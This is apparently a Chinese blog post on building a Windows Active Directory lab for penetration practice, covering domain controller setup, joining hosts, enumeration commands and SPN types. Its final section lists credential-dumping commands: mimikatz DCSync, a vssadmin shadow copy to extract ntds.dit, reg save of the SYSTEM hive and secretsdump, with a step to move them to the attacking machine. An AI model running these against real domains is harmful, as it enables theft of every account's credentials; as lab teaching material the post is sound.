---
title: "域环境搭建"
permalink: ad-environment-setup/
date: 2026-01-29 05:40:52
categories:
  - 网络安全
  - 内网渗透
tags:
  - 域渗透
  - AD
  - 环境搭建
img: /medias/featureimages/23.jpg
summary: "Windows 域控与域内主机的搭建流程、常见枚举命令，为域渗透练习打底。"
---

<!-- more -->

## 系统镜像安装
windows 7

windows 2008

windows 2012

用户名设置为 administrator ，节省手动激活 administrator 的时间 （windows 默认禁用 administrator）

## 安装vmtools
之前老版本的vmtools

## 安装AD （windows server 2012 ）
### 1  配置静态 ip （成为域控必须配置静态IP）

### 2  重命名计算机 （可选， 默认hostname是随机名）

### 3  安装ad

## 提升机器为域控 （windows server 2012）
点击“将此服务器提升为域控制器”

 设置任意域名

一个windows server 从普通的机器工作组环境变成域控时，用户发生了什么变化：

+ 安装域环境前的工作组管理员用户： administrator
+ 安装域环境后的域用户： 域名\administrator

从工作组管理员变成了域管理员，密码未发生改变

## 成员主机加入域
###  windows 7
#### 1  配置静态ip（dns地址需要有一个是 域控的ip）

#### 2  修改主机名

#### 3  加入域环境

 输入域控机器的用户名和密码

###  windows server 2008
#### 1  配置静态ip

#### 2  改主机名

#### 3 加入域环境

##  成员主机入域后，用户发生了什么变化
系统原有的工作组用户，无变化，成员入域后依然可以登录到本地的工作组 主机名\用户名 ，如 PC1-windows7\administrator 简写 .\administrator

成员主机也可以登录域用户 域名\用户名 ，如 baidu.com\administrator

##  域环境基础操作
## computers 容器
保存了成员主机的信息

## user 容器

### 新建一个普通的域用户
用户名：user01

密码：`1qaz@WSX`

 普通域用户，成员主机可以登录

### 新建一个域管理员用户
用户名：admin01

密码：1qaz@WSX3edc

## 域环境信息收集
### 判断是否是域环境
用户名判断 ： 域名\用户名

 ipconfig /all 判断：域环境会直接看到域名

### 用户信息
#### 查看域用户
`net  user  /domain`

#### 查看域用户组
`net  group  /domain`

#### 查看成员主机
` net group "domain computers" /domain  `

#### 查看域控
`net  group  "domain  controllers"  /domain `

#### 查看域管理员用户
 `net group "domain admins" /domain  `

#### 查看当前用户是否是域管理员 （是否在域管理员用户组中）
 `net user 用户名 /domain  `

### 定位域控
#### 1 ping 域名 / nslookup 域名

#### 2 dns 地址
不标准：域控和DNS服务在同一台主机中才行，而实际中，域控和 DNS是分开的，判断就会有误差

#### 3 ldap 查询
 `nslookup  _LDAP._TCP.dc._msdcs.域名  `

#### 4 spn 查询
spn 服务主体名称，域环境中只有注册了spn的服务才会使用 kerberos 认证，否则会被降级为网络认证

spn 会有自己的名字，如 host 是 smb服务、 termsrv 是 rdp 服务

| **服务类型 (Service Class)** | **对应功能/服务名称** | **典型用途** |
| --- | --- | --- |
| **HOST** | 核心宿主服务 | 涵盖 SMB、注册表访问、受限委派等，是默认的“全能”SPN。 |
| **TERMSRV** | 远程桌面服务 (RDP) | 用于通过 Kerberos 验证的远程桌面连接。 |
| **MSSQLSvc** | Microsoft SQL Server | 数据库服务的 Kerberos 身份验证（需指定端口）。 |
| **HTTP** | Web 服务 / WinRM | 用于 IIS 网站、WS-Management (PowerShell Remoting) 或 SSRS。 |
| **CIFS** | 通用互联网文件系统 | 专门用于 SMB 共享（通常在 HOST 下已包含，但 NAS 设备常显式映射）。 |
| **LDAP** | 轻量级目录访问协议 | 域控制器上的目录服务。 |
| **GC** | 全局编录 (Global Catalog) | 域控跨域查询服务。 |
| **DNS** | 域名系统 | 域控提供的 DNS 解析服务。 |
| **WSMAN** | Windows 远程管理 | WinRM 服务的另一种表现形式。 |
| **RestrictedKrbHost** | 受限 Kerberos 宿主 | 用于不支持完全主机 SPN 的受限场景。 |
| **ExchangeMDB** | Exchange 数据库服务 | 企业邮箱 Exchange Server 相关服务。 |
| **MAPSRVC** | 微软安装程序服务 | 软件分发与管理。 |

### 域环境密码凭证获取
#### 域管读取ntds.dit
前提：登录域管理员

**C:\Windows\NTDS\ntds.dit**

`**lsadump::dcsync /all /csv**`

#####  dcsync 域控同步服务

#### 域控读取ntds.dt
**前提: 登录到域控**

**vss 服务：volume shadow copy service 卷影复制服务。用于windows备份、windows还原点**

##### 1 为域控的c盘创建一个副本（快照）
`**vssadmin create shadow /for=c:**`

`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`

##### 2 从副本中把ntds.dit复制出来
`copy   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ windows\ntds\ntds.dit   C:\ntds.dit`

##### 3 导出为 system 文件
`reg  save  HKLM\system  C:\system`

`secretsdump.exe -system system -ntds ntds.dit LOCAL`

##### 4 把system文件和ntds.dit都传输到攻击机


